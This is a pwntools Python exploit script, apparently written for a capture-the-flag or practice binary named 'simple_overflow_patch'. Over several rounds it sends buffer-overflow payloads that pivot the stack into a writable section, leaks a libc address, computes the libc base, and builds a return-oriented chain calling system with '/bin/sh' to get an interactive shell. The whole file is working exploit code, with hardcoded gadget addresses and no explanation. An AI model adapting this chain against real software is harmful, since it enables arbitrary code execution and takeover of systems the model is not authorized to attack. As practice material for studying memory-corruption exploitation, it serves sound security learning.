#!/bin/python
from pwn import *
exe = ELF('./simple_overflow_patch')
p = process(exe.path)
context.terminal = ['foot']
gdb.attach(p, gdbscript='''
#b*main+90
           b*save_data+235

b*save_data+329
            c
            c
            c
            c
            c
            c
            c
            c
          c 
           c
           c
           c
           c
             
           ''')
read = 0x0000000000401435
mov_0_edi = 0x000000000040143d
save_data = 0x000000000040135b
main_addr = 0x00000000004014a5
pop_rbp = 0x000000000040125d 
mov_rax_rbp= 0x00000000004013d2
mov_rdi_rax = 0x00000000004013e0
fake_rbp = 0x4040d8
put_plt = 0x4010f0

to_printf = 0x00000000004013d2 
fflush_got = 0x404058
to_read = 0x0000000000401431
rw_section = 0x0000000000404c58
rw_section2 = 0x0000000000404cb8 
leave_ret = 0x000000000040149f
ret = 0x00000000004014a0 
#################exploiting########64#############
payload = b'a'
payload = payload.ljust(64 , b'\x00')
payload += p64(rw_section)
payload += p64(to_read)
# payload += p64(mov_rax_rbp)
# payload += p64(mov_rdi_rax)
# payload += p64(put_plt)
###################the first time ################
##change frame 
p.sendlineafter(b'Give me your name:', p64(rw_section))
p.sendafter(b'Data:', payload)
###############the second time ###################

payload = p64(0)
payload += p64(pop_rbp) + p64(0x0000000000404e00)
payload += p64(to_read)
payload += p64(fflush_got)
payload = payload.ljust(64, b'\x00')
payload += p64(rw_section -64)
payload += p64(leave_ret)
p.sendafter(b'Your data is saved',payload )




# ##############the third time ###################
flush_got_pointer = rw_section - 32
payload = b''
payload = payload.ljust(64, b'\x00')
payload +=p64(flush_got_pointer +0x58)
payload += p64(to_printf)
p.sendafter(b'data is saved',payload)
p.recvuntil(b'saved\n')
leak_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info("leak_adrr: " + hex(leak_addr))
# ###############the fourth time ###################
libc_base = leak_addr - 490000
log.info("libc_base: " + hex(libc_base))
pop_rax_libc = 0x00000000000420b3 + libc_base
pop_rsi_libc = 0x0000000000029cf1 + libc_base
pop_rdi_libc = 0x0000000000028265 + libc_base
pop_rdx_libc = 0x00000000001249da + libc_base
syscall_libc = 0x000000000002646e + libc_base


payload = b'a'
payload += p64(0)
payload = payload.ljust(64 , b'\x00')
payload += p64(0x0000000000404fc8)
payload += p64(0x0000000000401431)
p.sendafter(b'Data:',payload)

############the fifth time #####################


# payload = p64(pop_rax_libc) + p64(0x3b)
# payload += p64(pop_rdi_libc) + p64(0x404321)
# payload += p64(pop_rsi_libc) + p64(0)
# payload += p64(syscall_libc)
system_libc = libc_base + 0x4f760
bin_sh_libc = libc_base + 0x19ae34
payload = p64(0x00000000004014a0)
payload += p64(pop_rdi_libc) + p64(bin_sh_libc)
payload += p64(system_libc)
payload = payload.ljust(64 , b'\x00')
payload += p64(0x0000000000404f80)
payload += p64(0x000000000040149f)
p.send(payload)
##############the end###########################
p.interactive()
